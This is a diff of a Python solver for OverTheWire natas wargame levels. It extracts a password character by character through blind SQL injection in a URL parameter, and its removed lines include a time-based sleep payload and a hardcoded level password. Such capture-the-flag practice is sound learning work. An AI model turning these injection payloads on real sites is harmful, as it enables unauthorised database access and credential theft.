@@ -3,9 +3,9 @@ import string
 import requests
 
 # page login creds
-user = "natas17"
-passwd = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
-url = "http://natas17.natas.labs.overthewire.org?username={0}&debug=1"
+user = "natas15"
+passwd = "lost passowrd when i refactored this file for a later test"
+url = "http://natas15.natas.labs.overthewire.org?username={0}&debug=1"
 check_string = "This user exists."
 
 # password stuffs
@@ -13,7 +13,7 @@ charset = [ch for ch in (string.ascii_lowercase + string.ascii_uppercase  + stri
 
 pass_charset = ""
 for ch in charset:
-    uri = url.format('natas18" and password like BINARY "%' + ch + '%" and if (username = "natas18", sleep(2), 1); -- ')
+    uri = url.format('natas16" and password like BINARY "%' + ch + '%" ; -- ')
 
     res = requests.get(uri, auth=(user, passwd)).text
     if check_string in res:
@@ -27,7 +27,7 @@ while True:
     found = False
 
     for char in pass_charset:
-        uri = url.format('natas18" and password like BINARY "' + ''.join([new_password, char]) + '%" and if (username = "natas18", sleep(2), 1); -- ')
+        uri = url.format('natas16" and password like BINARY "' + ''.join([new_password, char]) + '%" ; -- ')
         response = requests.get(uri, auth=(user, passwd))
 
         res = requests.get(uri, auth=(user, passwd)).text
